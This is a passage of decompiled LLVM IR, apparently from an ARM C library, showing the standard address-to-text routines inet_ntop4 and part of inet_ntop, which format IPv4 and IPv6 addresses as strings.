dec_label_pc_1ada8:                               ; preds = %dec_label_pc_1ad90, %dec_label_pc_1ad78, %dec_label_pc_1abd0, %dec_label_pc_1ad98
  %v1_1adb0 = phi i32 [ 0, %dec_label_pc_1ad90 ], [ 1, %dec_label_pc_1ad78 ], [ %v3_1abd8, %dec_label_pc_1abd0 ], [ -1, %dec_label_pc_1ad98 ]
  store i32 %v3_1aba4, i32* @r4, align 4
  store i32 %v6_1aba4, i32* @r5, align 4
  store i32 %v9_1aba4, i32* @r6, align 4
  store i32 %v12_1aba4, i32* @r7, align 4
  store i32 %v27_1aba4, i32* @lr, align 4
  ret i32 %v1_1adb0

; uselistorder directives
  uselistorder i32 %v2_1ad5c, { 1, 0 }
  uselistorder i32 %v2_1ad58, { 1, 0 }
  uselistorder i32 %v0_1ad64, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_1ad5c, { 1, 3, 0, 2 }
  uselistorder i32 %v0_1ad6c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ad70.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1ad70.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1ad1c, { 1, 0 }
  uselistorder i32 %v0_1ad04.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_1acf4, { 1, 0 }
  uselistorder i32 %v0_1accc, { 1, 0, 2 }
  uselistorder i32 %v3_1aca0, { 1, 0 }
  uselistorder i32 %v0_1ac94, { 1, 0, 2 }
  uselistorder i32 %v1_1ac40, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_1ac30, { 1, 0 }
  uselistorder i32 %v0_1ac1c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1ada8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1ad90, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1ad70, { 1, 0 }
  uselistorder label %dec_label_pc_1ad58, { 1, 0 }
  uselistorder label %dec_label_pc_1ad2c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1acf4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ac30, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_1ae98 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1ae78 = add i32 %v2_1ae98, -17
  br label %dec_label_pc_1ae98

dec_label_pc_1ade8:                               ; preds = %dec_label_pc_1ae98
  %v0_1ade8 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ade8 = add i32 %v0_1ade8, %v1_1ade8
  %v3_1ade8 = inttoptr i32 %v2_1ade8 to i8*
  %v4_1ade8 = load i8, i8* %v3_1ade8, align 1
  %v6_1ade8 = zext i8 %v4_1ade8 to i32
  store i32 %v6_1ade8, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_1ade8, 100
  %v2_1adf0 = zext i8 %div4 to i32
  store i32 %v2_1adf0, i32* %r0.global-to-local, align 4
  %v1_1adf4 = or i8 %div4, 48
  %v3_1adf8 = add i32 %v2_1aea8, -17
  %v4_1adf8 = inttoptr i32 %v3_1adf8 to i8*
  store i8 %v1_1adf4, i8* %v4_1adf8, align 1
  %v0_1adfc = load i32, i32* %r5.global-to-local, align 4
  %v1_1adfc = add i32 %v0_1adfc, -17
  %v2_1adfc = inttoptr i32 %v1_1adfc to i8*
  %v3_1adfc = load i8, i8* %v2_1adfc, align 1
  %v0_1ae00 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae00 = add i32 %v0_1ae00, 1
  store i32 %v1_1ae00, i32* %r6.global-to-local, align 4
  store i32 %v2_1ae98, i32* %r2.global-to-local, align 4
  %v7_1ae08 = icmp eq i8 %v3_1adfc, 48
  %v0_1ae10 = load i32, i32* %r4.global-to-local, align 4
  %v0_1ae18 = load i32, i32* %fp.global-to-local, align 4
  %v1_1ae18 = load i32, i32* %sl.global-to-local, align 4
  %v2_1ae18 = add i32 %v1_1ae18, %v0_1ae18
  store i32 %v2_1ae18, i32* %sb.global-to-local, align 4
  %v2_1ae20 = udiv i32 %v0_1ae10, 10
  %v1_1ae28 = urem i32 %v2_1ae20, 256
  %v2_1ae2c = udiv i32 %v1_1ae28, 10
  %v3_1ae2c = urem i32 %v1_1ae28, 10
  store i32 %v2_1ae2c, i32* %r0.global-to-local, align 4
  %v1_1ae30 = or i32 %v3_1ae2c, 48
  br i1 %v7_1ae08, label %dec_label_pc_1ae20, label %dec_label_pc_1ae48

dec_label_pc_1ae20:                               ; preds = %dec_label_pc_1ade8
  %v7_1ae38 = icmp eq i32 %v1_1ae30, 48
  br i1 %v7_1ae38, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1ae20
  store i32 %v1_1ae00, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1ae20, %bb
  %v1_1ae40 = trunc i32 %v1_1ae30 to i8
  store i8 %v1_1ae40, i8* %v2_1adfc, align 1
  %v0_1ae74.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ae64

dec_label_pc_1ae48:                               ; preds = %dec_label_pc_1ade8
  %v2_1ae14 = add i32 %v1_1ae00, %v2_1ae98
  %v1_1ae5c = trunc i32 %v1_1ae30 to i8
  %v3_1ae5c = add i32 %v2_1ae14, -17
  %v4_1ae5c = inttoptr i32 %v3_1ae5c to i8*
  store i8 %v1_1ae5c, i8* %v4_1ae5c, align 1
  %v0_1ae60 = load i32, i32* %r6.global-to-local, align 4
  %v1_1ae60 = add i32 %v0_1ae60, 1
  store i32 %v1_1ae60, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1ae64

dec_label_pc_1ae64:                               ; preds = %bb18, %dec_label_pc_1ae48
  %v0_1ae74 = phi i32 [ %v0_1ae74.pre, %bb18 ], [ %v1_1ae60, %dec_label_pc_1ae48 ]
  %v0_1ae64 = load i32, i32* %sb.global-to-local, align 4
  %v1_1ae64 = inttoptr i32 %v0_1ae64 to i8*
  %v2_1ae64 = load i8, i8* %v1_1ae64, align 1
  %tmp19 = urem i8 %v2_1ae64, 10
  store i32 %v2_1ae98, i32* %ip.global-to-local, align 4
  %v1_1ae74 = add i32 %v0_1ae74, 1
  store i32 %v1_1ae74, i32* %r0.global-to-local, align 4
  %v1_1ae7c = or i8 %tmp19, 48
  %v3_1ae80 = add i32 %v2_1ae78, %v0_1ae74
  %v4_1ae80 = inttoptr i32 %v3_1ae80 to i8*
  store i8 %v1_1ae7c, i8* %v4_1ae80, align 1
  %v0_1ae84 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ae84 = load i32, i32* %r0.global-to-local, align 4
  %v2_1ae84 = add i32 %v1_1ae84, %v0_1ae84
  store i32 %v2_1ae84, i32* %r2.global-to-local, align 4
  %v3_1ae8c = add i32 %v2_1ae84, -17
  %v4_1ae8c = inttoptr i32 %v3_1ae8c to i8*
  store i8 46, i8* %v4_1ae8c, align 1
  %v0_1ae90 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ae90 = add i32 %v0_1ae90, 1
  store i32 %v1_1ae90, i32* %r6.global-to-local, align 4
  %v0_1ae94 = load i32, i32* %sl.global-to-local, align 4
  %v1_1ae94 = add i32 %v0_1ae94, 1
  store i32 %v1_1ae94, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1ae98

dec_label_pc_1ae98:                               ; preds = %entry, %dec_label_pc_1ae64
  %v0_1aea4 = phi i32 [ 0, %entry ], [ %v1_1ae90, %dec_label_pc_1ae64 ]
  %v1_1ade8 = phi i32 [ 0, %entry ], [ %v1_1ae94, %dec_label_pc_1ae64 ]
  store i32 %v2_1ae98, i32* %ip.global-to-local, align 4
  store i32 %v0_1aea4, i32* %r7.global-to-local, align 4
  %v2_1aea8 = add i32 %v0_1aea4, %v2_1ae98
  store i32 %v2_1aea8, i32* %r5.global-to-local, align 4
  %v7_1aeac = icmp sgt i32 %v1_1ade8, 3
  br i1 %v7_1aeac, label %dec_label_pc_1aeb0, label %dec_label_pc_1ade8

dec_label_pc_1aeb0:                               ; preds = %dec_label_pc_1ae98
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1aeb4 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_1aeb4, i32* %r4.global-to-local, align 4
  %v3_1aeb8 = add i32 %v2_1aea8, -18
  %v4_1aeb8 = inttoptr i32 %v3_1aeb8 to i8*
  store i8 0, i8* %v4_1aeb8, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_1aeb4, i32* %r0.global-to-local, align 4
  %v3_1aec0 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1aec0, i32* %r0.global-to-local, align 4
  %v2_1aec4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_1aec4, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_1aec0, %v2_1aec4
  br i1 %tmp, label %dec_label_pc_1aed0, label %dec_label_pc_1aee4

dec_label_pc_1aed0:                               ; preds = %dec_label_pc_1aeb0
  %v0_1aed0 = call i32 @__GI___errno_location()
  store i32 %v0_1aed0, i32* %r0.global-to-local, align 4
  %v0_1aed8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1aed8, i32* %r2.global-to-local, align 4
  %v2_1aedc = inttoptr i32 %v0_1aed0 to i32*
  store i32 28, i32* %v2_1aedc, align 4
  %v0_1aef4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aef4

dec_label_pc_1aee4:                               ; preds = %dec_label_pc_1aeb0
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_1aeb4, i32* @r1, align 4
  %v2_1aeec = inttoptr i32 %arg2 to i8*
  %v3_1aeec = call i32 @strcpy(i8* %v2_1aeec, i32 %v2_1aeb4)
  store i32 %v3_1aeec, i32* %r0.global-to-local, align 4
  store i32 %v3_1aeec, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aef4

dec_label_pc_1aef4:                               ; preds = %dec_label_pc_1aed0, %dec_label_pc_1aee4
  %v0_1aef4 = phi i32 [ %v0_1aef4.pre, %dec_label_pc_1aed0 ], [ %v3_1aeec, %dec_label_pc_1aee4 ]
  store i32 %v0_1aef4, i32* %r0.global-to-local, align 4
  ret i32 %v0_1aef4

; uselistorder directives
  uselistorder i32 %v0_1aef4, { 1, 0 }
  uselistorder i32 %v2_1aeb4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1aea8, { 0, 2, 1 }
  uselistorder i32 %v1_1ade8, { 1, 0 }
  uselistorder i32 %v1_1ae30, { 1, 0, 2 }
  uselistorder i32 %v2_1ae98, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1aef4, { 1, 0 }
  uselistorder label %dec_label_pc_1ae98, { 1, 0 }
  uselistorder label %dec_label_pc_1ae64, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_1af04 = load i32, i32* @r5, align 4
  %v7_1af10 = icmp eq i32 %arg1, 2
  store i1 %v7_1af10, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_1af10, label %dec_label_pc_1af34, label %dec_label_pc_1af28

dec_label_pc_1af28:                               ; preds = %entry
  %v7_1af28 = icmp eq i32 %arg1, 10
  store i1 %v7_1af28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1af28, label %dec_label_pc_1af48, label %dec_label_pc_1b15c

dec_label_pc_1af34:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_1af40 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1b154

dec_label_pc_1af48:                               ; preds = %dec_label_pc_1af28
  %v2_1af48 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1af48, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_1af54 = bitcast i32* %stack_var_-72 to i8*
  %v3_1af54 = call i32 @__GI_memset(i8* %v2_1af54, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1af78 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_1af5c

dec_label_pc_1af5c:                               ; preds = %dec_label_pc_1af5c.dec_label_pc_1af5c_crit_edge, %dec_label_pc_1af48
  %v0_1af74 = phi i32 [ %v0_1af5c.pre, %dec_label_pc_1af5c.dec_label_pc_1af5c_crit_edge ], [ 0, %dec_label_pc_1af48 ]
  %v1_1af5c = load i32, i32* @r8, align 4
  %v2_1af5c = add i32 %v1_1af5c, %v0_1af74
  %v3_1af60 = inttoptr i32 %v2_1af5c to i8*
  %v4_1af60 = load i8, i8* %v3_1af60, align 1
  %v6_1af60 = zext i8 %v4_1af60 to i32
  %v1_1af64 = add i32 %v2_1af5c, 1
  %v2_1af64 = inttoptr i32 %v1_1af64 to i8*
  %v3_1af64 = load i8, i8* %v2_1af64, align 1
  %v4_1af64 = zext i8 %v3_1af64 to i32
  %tmp74 = icmp slt i32 %v0_1af74, 0
  %v4_1af68 = zext i1 %tmp74 to i32
  %v5_1af68 = add i32 %v4_1af68, %v0_1af74
  %v4_1af6c = mul nuw nsw i32 %v6_1af60, 256
  %v5_1af6c = or i32 %v4_1af64, %v4_1af6c
  store i32 %v5_1af6c, i32* %r2.global-to-local, align 4
  %v3_1af70 = sdiv i32 %v5_1af68, 2
  %v1_1af74 = add i32 %v0_1af74, 2
  store i32 %v1_1af74, i32* %r0.global-to-local, align 4
  %v4_1af7c = mul i32 %v3_1af70, 4
  %v5_1af7c = add i32 %v4_1af7c, %v2_1af78
  %v7_1af80 = icmp eq i32 %v1_1af74, 15
  store i1 %v7_1af80, i1* %cpsr_z.global-to-local, align 1
  %v2_1af84 = add i32 %v5_1af7c, -32
  %v3_1af84 = inttoptr i32 %v2_1af84 to i32*
  store i32 %v5_1af6c, i32* %v3_1af84, align 4
  %v7_1af88 = icmp sgt i32 %v1_1af74, 15
  br i1 %v7_1af88, label %dec_label_pc_1af8c, label %dec_label_pc_1af5c.dec_label_pc_1af5c_crit_edge

dec_label_pc_1af5c.dec_label_pc_1af5c_crit_edge:  ; preds = %dec_label_pc_1af5c
  %v0_1af5c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1af5c

dec_label_pc_1af8c:                               ; preds = %dec_label_pc_1af5c
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1afa4

dec_label_pc_1afa4:                               ; preds = %dec_label_pc_1af8c, %dec_label_pc_1aff0
  %v0_1afe4 = phi i32 [ -1, %dec_label_pc_1af8c ], [ %v0_1b018, %dec_label_pc_1aff0 ]
  %v0_1afd4 = phi i32 [ -1, %dec_label_pc_1af8c ], [ %v0_1b004, %dec_label_pc_1aff0 ]
  %v0_1afb8 = phi i32 [ -1, %dec_label_pc_1af8c ], [ %v0_1afb87, %dec_label_pc_1aff0 ]
  %v0_1aff0 = phi i32 [ 0, %dec_label_pc_1af8c ], [ %v1_1aff0, %dec_label_pc_1aff0 ]
  %v4_1afa8 = mul nuw nsw i32 %v0_1aff0, 4
  %v5_1afa8 = add i32 %v4_1afa8, %v2_1af78
  %v1_1afac = add i32 %v5_1afa8, -32
  %v2_1afac = inttoptr i32 %v1_1afac to i32*
  %v3_1afac = load i32, i32* %v2_1afac, align 4
  %v2_1afb0 = icmp eq i32 %v3_1afac, 0
  %v7_1afb8 = icmp eq i32 %v0_1afb8, -1
  br i1 %v2_1afb0, label %dec_label_pc_1afb8, label %dec_label_pc_1afcc

dec_label_pc_1afb8:                               ; preds = %dec_label_pc_1afa4
  br i1 %v7_1afb8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1afb8
  store i32 %v0_1aff0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1aff0

.thread:                                          ; preds = %dec_label_pc_1afb8
  %v1_1afc4.pre = load i32, i32* @r4, align 4
  %v2_1afc4 = add i32 %v1_1afc4.pre, 1
  store i32 %v2_1afc4, i32* @r4, align 4
  br label %dec_label_pc_1aff0

dec_label_pc_1afcc:                               ; preds = %dec_label_pc_1afa4
  br i1 %v7_1afb8, label %dec_label_pc_1aff0, label %dec_label_pc_1afd4

dec_label_pc_1afd4:                               ; preds = %dec_label_pc_1afcc
  %v7_1afd4 = icmp eq i32 %v0_1afd4, -1
  %v0_1afe8.pre = load i32, i32* @r4, align 4
  %v1_1afdc = load i32, i32* @r7, align 4
  %v7_1afe0 = icmp sgt i32 %v0_1afe8.pre, %v1_1afdc
  %or.cond = or i1 %v7_1afd4, %v7_1afe0
  br i1 %or.cond, label %dec_label_pc_1afe4, label %dec_label_pc_1afec

dec_label_pc_1afe4:                               ; preds = %dec_label_pc_1afd4
  store i32 %v0_1afe4, i32* @r6, align 4
  store i32 %v0_1afe8.pre, i32* @r7, align 4
  br label %dec_label_pc_1afec

dec_label_pc_1afec:                               ; preds = %dec_label_pc_1afd4, %dec_label_pc_1afe4
  %v0_1afd412 = phi i32 [ %v0_1afe4, %dec_label_pc_1afe4 ], [ %v0_1afd4, %dec_label_pc_1afd4 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aff0

dec_label_pc_1aff0:                               ; preds = %bb, %.thread, %dec_label_pc_1afcc, %dec_label_pc_1afec
  %v0_1b018 = phi i32 [ %v0_1afe4, %.thread ], [ %v0_1aff0, %bb ], [ %v0_1afe4, %dec_label_pc_1afcc ], [ -1, %dec_label_pc_1afec ]
  %v0_1afb87 = phi i32 [ %v0_1afb8, %.thread ], [ %v0_1aff0, %bb ], [ -1, %dec_label_pc_1afcc ], [ -1, %dec_label_pc_1afec ]
  %v0_1b004 = phi i32 [ %v0_1afd4, %.thread ], [ %v0_1afd4, %bb ], [ %v0_1afd4, %dec_label_pc_1afcc ], [ %v0_1afd412, %dec_label_pc_1afec ]
  %v1_1aff0 = add nuw nsw i32 %v0_1aff0, 1
  %v7_1aff8 = icmp slt i32 %v1_1aff0, 8
  br i1 %v7_1aff8, label %dec_label_pc_1afa4, label %dec_label_pc_1affc

dec_label_pc_1affc:                               ; preds = %dec_label_pc_1aff0
  %v7_1affc = icmp eq i32 %v0_1b018, -1
  store i1 %v7_1affc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1affc, label %dec_label_pc_1affc.dec_label_pc_1b01c_crit_edge, label %dec_label_pc_1b004

dec_label_pc_1affc.dec_label_pc_1b01c_crit_edge:  ; preds = %dec_label_pc_1affc
  %v1_1b040.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b01c

dec_label_pc_1b004:                               ; preds = %dec_label_pc_1affc
  %v7_1b004 = icmp eq i32 %v0_1b004, -1
  store i1 %v7_1b004, i1* %cpsr_z.global-to-local, align 1
  %v0_1b014.pre = load i32, i32* @r4, align 4
  br i1 %v7_1b004, label %dec_label_pc_1b014, label %dec_label_pc_1b00c

dec_label_pc_1b00c:                               ; preds = %dec_label_pc_1b004
  %v1_1b00c = load i32, i32* @r7, align 4
  %v9_1b00c = icmp eq i32 %v0_1b014.pre, %v1_1b00c
  store i1 %v9_1b00c, i1* %cpsr_z.global-to-local, align 1
  %v7_1b010 = icmp sgt i32 %v0_1b014.pre, %v1_1b00c
  br i1 %v7_1b010, label %dec_label_pc_1b014, label %dec_label_pc_1b01c

dec_label_pc_1b014:                               ; preds = %dec_label_pc_1b004, %dec_label_pc_1b00c
  store i32 %v0_1b014.pre, i32* @r7, align 4
  store i32 %v0_1b018, i32* @r6, align 4
  br label %dec_label_pc_1b01c

dec_label_pc_1b01c:                               ; preds = %dec_label_pc_1affc.dec_label_pc_1b01c_crit_edge, %dec_label_pc_1b00c, %dec_label_pc_1b014
  %v1_1b040.pre = phi i32 [ %v1_1b00c, %dec_label_pc_1b00c ], [ %v1_1b040.pre.pre, %dec_label_pc_1affc.dec_label_pc_1b01c_crit_edge ], [ %v0_1b014.pre, %dec_label_pc_1b014 ]
  %v0_1b01c = phi i32 [ %v0_1b004, %dec_label_pc_1b00c ], [ %v0_1b004, %dec_label_pc_1affc.dec_label_pc_1b01c_crit_edge ], [ %v0_1b018, %dec_label_pc_1b014 ]
  %v7_1b01c = icmp eq i32 %v0_1b01c, -1
  store i1 %v7_1b01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b01c, label %dec_label_pc_1b01c._crit_edge, label %dec_label_pc_1b024

dec_label_pc_1b024:                               ; preds = %dec_label_pc_1b01c
  %v7_1b024 = icmp eq i32 %v1_1b040.pre, 1
  store i1 %v7_1b024, i1* %cpsr_z.global-to-local, align 1
  %v7_1b028 = icmp slt i32 %v1_1b040.pre, 2
  br i1 %v7_1b028, label %bb54, label %dec_label_pc_1b01c._crit_edge

bb54:                                             ; preds = %dec_label_pc_1b024
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1b01c._crit_edge

dec_label_pc_1b01c._crit_edge:                    ; preds = %dec_label_pc_1b01c, %dec_label_pc_1b024, %bb54
  %v0_1b040 = phi i32 [ %v0_1b01c, %dec_label_pc_1b024 ], [ -1, %bb54 ], [ %v0_1b01c, %dec_label_pc_1b01c ]
  %v2_1b030 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1b030, i32* @r4, align 4
  %v0_1b034 = load i32, i32* @r5, align 4
  %v2_1b034 = add i32 %v0_1b034, -1328
  store i32 %v2_1b034, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1b040 = add i32 %v0_1b040, %v1_1b040.pre
  store i32 %v2_1b040, i32* @sl, align 4
  %v9_1b0a0 = icmp eq i32 %tmp, 65535
  %v7_1b04868 = icmp eq i32 %v0_1b040, -1
  store i1 %v7_1b04868, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b048

dec_label_pc_1b048:                               ; preds = %dec_label_pc_1b01c._crit_edge, %dec_label_pc_1b0f8
  %v7_1b04872 = phi i1 [ %v7_1b04868, %dec_label_pc_1b01c._crit_edge ], [ %v7_1b048, %dec_label_pc_1b0f8 ]
  %v0_1b07471 = phi i32 [ 0, %dec_label_pc_1b01c._crit_edge ], [ %v1_1b0f8, %dec_label_pc_1b0f8 ]
  %v1_1b06070 = phi i32 [ %v0_1b040, %dec_label_pc_1b01c._crit_edge ], [ %v0_1b048.pre, %dec_label_pc_1b0f8 ]
  %v2_1b07869 = phi i32 [ %v2_1b030, %dec_label_pc_1b01c._crit_edge ], [ %v3_1b06429, %dec_label_pc_1b0f8 ]
  br i1 %v7_1b04872, label %dec_label_pc_1b06c, label %dec_label_pc_1b050

dec_label_pc_1b050:                               ; preds = %dec_label_pc_1b048
  %v9_1b050 = icmp eq i32 %v0_1b07471, %v1_1b06070
  store i1 %v9_1b050, i1* %cpsr_z.global-to-local, align 1
  %v5_1b054 = icmp slt i32 %v0_1b07471, %v1_1b06070
  br i1 %v5_1b054, label %dec_label_pc_1b06c, label %dec_label_pc_1b058

dec_label_pc_1b058:                               ; preds = %dec_label_pc_1b050
  %v1_1b058 = load i32, i32* @sl, align 4
  %v9_1b058 = icmp eq i32 %v0_1b07471, %v1_1b058
  store i1 %v9_1b058, i1* %cpsr_z.global-to-local, align 1
  %v6_1b05c = icmp slt i32 %v0_1b07471, %v1_1b058
  br i1 %v6_1b05c, label %dec_label_pc_1b060, label %dec_label_pc_1b06c

dec_label_pc_1b060:                               ; preds = %dec_label_pc_1b058
  store i1 %v9_1b050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b050, label %bb56, label %dec_label_pc_1b0f8

bb56:                                             ; preds = %dec_label_pc_1b060
  %v1_1b064 = load i32, i32* @sb, align 4
  %v2_1b064 = trunc i32 %v1_1b064 to i8
  %v4_1b064 = inttoptr i32 %v2_1b07869 to i8*
  store i8 %v2_1b064, i8* %v4_1b064, align 1
  %v5_1b064 = load i32, i32* @r4, align 4
  %v6_1b064 = add i32 %v5_1b064, 1
  store i32 %v6_1b064, i32* @r4, align 4
  br label %dec_label_pc_1b0f8

dec_label_pc_1b06c:                               ; preds = %dec_label_pc_1b058, %dec_label_pc_1b050, %dec_label_pc_1b048
  %v2_1b06c = icmp eq i32 %v0_1b07471, 0
  store i1 %v2_1b06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b06c, label %dec_label_pc_1b0dc, label %dec_label_pc_1b074

dec_label_pc_1b074:                               ; preds = %dec_label_pc_1b06c
  %v7_1b074 = icmp eq i32 %v0_1b07471, 6
  store i1 %v7_1b074, i1* %cpsr_z.global-to-local, align 1
  %v0_1b078 = load i32, i32* @sb, align 4
  %v1_1b078 = trunc i32 %v0_1b078 to i8
  %v3_1b078 = inttoptr i32 %v2_1b07869 to i8*
  store i8 %v1_1b078, i8* %v3_1b078, align 1
  %v4_1b078 = load i32, i32* @r4, align 4
  %v5_1b078 = add i32 %v4_1b078, 1
  store i32 %v5_1b078, i32* @r4, align 4
  %v0_1b07c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b07c, label %dec_label_pc_1b080, label %dec_label_pc_1b0dc

dec_label_pc_1b080:                               ; preds = %dec_label_pc_1b074
  %v0_1b080 = load i32, i32* @r6, align 4
  %v2_1b080 = icmp eq i32 %v0_1b080, 0
  store i1 %v2_1b080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b080, label %dec_label_pc_1b088, label %dec_label_pc_1b0dc

dec_label_pc_1b088:                               ; preds = %dec_label_pc_1b080
  %v0_1b088 = load i32, i32* @r7, align 4
  %v7_1b088 = icmp eq i32 %v0_1b088, 6
  store i1 %v7_1b088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b088, label %dec_label_pc_1b0a8, label %dec_label_pc_1b090

dec_label_pc_1b090:                               ; preds = %dec_label_pc_1b088
  %v7_1b090 = icmp eq i32 %v0_1b088, 5
  store i1 %v7_1b090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b090, label %dec_label_pc_1b098, label %dec_label_pc_1b0dc

dec_label_pc_1b098:                               ; preds = %dec_label_pc_1b090
  store i1 %v9_1b0a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b0a0, label %dec_label_pc_1b0a8, label %dec_label_pc_1b0dc

dec_label_pc_1b0a8:                               ; preds = %dec_label_pc_1b098, %dec_label_pc_1b088
  %v2_1b0ac = sub i32 %v2_1af78, %v5_1b078
  %v1_1b0b0 = add i32 %v2_1b0ac, -32
  store i32 %v1_1b0b0, i32* %r2.global-to-local, align 4
  %v0_1b0b4 = load i32, i32* @r8, align 4
